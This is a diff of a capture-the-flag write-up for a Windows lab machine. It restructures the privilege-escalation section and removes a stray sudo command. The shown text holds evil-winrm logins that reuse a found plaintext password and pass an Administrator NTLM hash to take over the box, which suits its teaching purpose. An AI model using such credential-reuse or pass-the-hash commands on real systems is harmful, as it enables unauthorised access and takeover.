@@ -128,7 +128,11 @@ We found a script and when we check what does it do, we find some credentials fo
 
 ![scriptcreds](/images/scripcreds.jpg)
 
-Let's find out more:
+
+
+## Privilege escalation
+
+Let's try to connect:
 
 ```
 evil-winrm -i 10.10.31.71 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
@@ -157,15 +161,3 @@ evil-winrm -i 10.10.31.71 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09
 It worked! And now we can read the system.txt file to grab the system flag.
 
 ![root](/images/root.jpg)
-
-
-
-
-
-## Privilege escalation
-
-Let's check if sudo has any additional configuration..
-
-```
-sudo cat /root/root.txt
-```
